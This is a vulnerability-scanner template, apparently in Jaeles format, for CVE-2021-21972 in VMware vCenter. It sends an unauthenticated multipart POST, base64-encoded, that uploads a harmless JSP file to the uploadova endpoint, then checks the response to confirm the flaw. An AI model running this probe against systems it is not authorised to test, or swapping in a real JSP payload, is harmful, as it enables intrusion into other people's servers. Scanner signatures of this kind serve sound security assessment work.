id: cve-2021-21972
info:
  name: vCenter Server RCE Probing (CVE-2021-21972)
  risk: Critical

replicate:
  ports: '9443'

params:
  - root: "{{.BaseURL}}"
  - postpl: "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNTg1NDc5Njc5MjM1NjIxMTU4NTY0ODY2NjU4MQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ1cGxvYWRGaWxlIjsgZmlsZW5hbWU9IjB4ZDBmZjkuanNwIg0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0NCg0KbGFsYWxhDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTU4NTQ3OTY3OTIzNTYyMTE1ODU2NDg2NjY1ODEtLQ0K"

requests:
  - method: POST
    redirect: false
    url: >-
      {{.root}}/ui/vropspluginui/rest/services/uploadova
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
      - Content-Type: multipart/form-data; boundary=---------------------------15854796792356211585648666581
    body: |
      {{ .postpl | b64dec }}
    detections:
      - >-
        StatusCode() == 200 && (StringSearch("body", "SUCCESS") || StringSearch("body", "FAILED")) && ContentLength('body') < 100 && StringSearch("resHeaders", "JSESSIONID=")

  # - method: POST
  #   redirect: false
  #   url: >-
  #     {{.root}}/ui/vropspluginui/rest/services/uploadova
  #   headers:
  #     - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
  #   detections:
  #     - >-
  #       StatusCode() == 500 && StringSearch("body", "org.springframework.web.bind.MissingServletRequestParameterException") && StringSearch("body", "stackTrace")

references:
  - links:
      - https://swarm.ptsecurity.com/unauth-rce-vmware/
      - https://github.com/NS-Sp4ce/CVE-2021-21972